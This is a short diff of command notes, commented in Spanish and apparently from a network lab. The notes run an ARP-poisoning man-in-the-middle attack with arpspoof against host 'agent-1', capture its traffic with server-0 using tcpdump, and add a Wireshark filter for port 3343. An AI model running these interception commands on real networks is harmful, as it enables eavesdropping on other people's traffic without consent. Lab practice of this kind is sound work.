@@ -1,6 +1,9 @@
 # arp poisonning
 # Engaña a Agent-1 diciéndole que eres Server-1
-sudo arpspoof -i wlan0 -t agent-1 server-0
+arpspoof -i enp9s0 -t agent-1 server-0
 
 # tcpdump
-sudo tcpdump -i <INTERFAZ> host server-0 and agent-1 -w captura.pcap
+tcpdump -i enp9s0 host server-0 and agent-1 -w captura.pcap
+
+# filtro Wireshark
+tcp.port == 3343
